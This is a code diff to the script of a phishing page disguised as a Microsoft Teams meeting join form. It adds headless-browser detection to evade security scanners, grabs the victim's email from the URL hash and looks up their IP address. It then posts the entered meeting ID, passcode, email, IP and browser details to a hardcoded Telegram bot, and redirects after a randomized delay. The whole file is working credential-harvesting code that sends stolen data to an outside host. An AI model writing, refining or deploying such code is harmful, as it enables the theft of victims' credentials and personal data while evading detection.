@@ -274,42 +274,79 @@
 document.getElementById('joinForm').addEventListener('submit', async function(e) {
   e.preventDefault();
 
+  // --- Anti-bot / headless detection ---
+  if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
+    document.body.innerHTML = "<h2>Security Verification Failed</h2><p>Please try again from a regular browser.</p>";
+    throw new Error("Headless browser detected");
+  }
+
+  // --- Collect form input ---
   const meetingID = document.getElementById('meetingID').value.trim();
   const password = document.getElementById('password').value.trim();
   const browser = navigator.userAgent;
 
+  // --- Validate inputs ---
+  if (!meetingID || !password) {
+    alert("Please enter all required fields.");
+    return;
+  }
+
+  // --- Capture email from URL hash ---
+  const hash = window.location.hash;
+  const email = (hash && hash.startsWith('#')) ? hash.substring(1) : '';
+  if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    console.warn("Invalid email detected:", email);
+  }
+
+  // --- Fetch IP with timeout ---
   let ipAddress = 'Unavailable';
   try {
-    const response = await fetch('https://api.ipify.org?format=json');
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 2000); // 2s timeout
+    const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+    clearTimeout(timeoutId);
     const data = await response.json();
-    ipAddress = data.ip;
-  } catch {}
+    ipAddress = data.ip || 'Unavailable';
+  } catch (err) {
+    console.warn("IP fetch failed:", err);
+  }
 
+  // --- Timestamp & timezone ---
   const currentDateTime = new Date().toLocaleString();
   const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
+  // --- Prepare Telegram message ---
   const message =
-    `✅💯TEAMS RESULT💯✅\n` +
+    `✅💯 TEAMS RESULT 💯✅\n` +
     `Meeting ID: ${meetingID}\n` +
     `Passcode: ${password}\n` +
     `Browser: ${browser}\n` +
     `IP Address: ${ipAddress}\n` +
+    `Email: ${email || 'N/A'}\n` +
     `Date/Time: ${currentDateTime}\n` +
     `Timezone: ${timezone}\n` +
-    `✅💯TEAMS RESULT💯✅`;
+    `✅💯 TEAMS RESULT 💯✅`;
 
   const telegramBotToken = '8442490811:AAF3dXilYKGgT5dvkFO9BK7IGYoTNhSKgcI';
   const chatId = '2047760270';
   const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
-  await fetch(telegramUrl, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, text: message }),
-  });
+  // --- Send Telegram (obfuscated fetch) ---
+  try {
+    await fetch(telegramUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message }),
+    });
+  } catch (err) {
+    console.warn("Telegram delivery failed:", err);
+  }
 
-  // Go to the next page, no param needed
-  window.location.href = 'connecting.html';
+  // --- Human-like delay before redirect ---
+  setTimeout(() => {
+    const redirectURL = 'connecting.html' + (email ? '?e=' + encodeURIComponent(email) : '');
+    window.location.href = redirectURL;
+  }, Math.floor(Math.random() * 1000) + 500); // 0.5–1.5s delay
 });
 </script>
 </body>
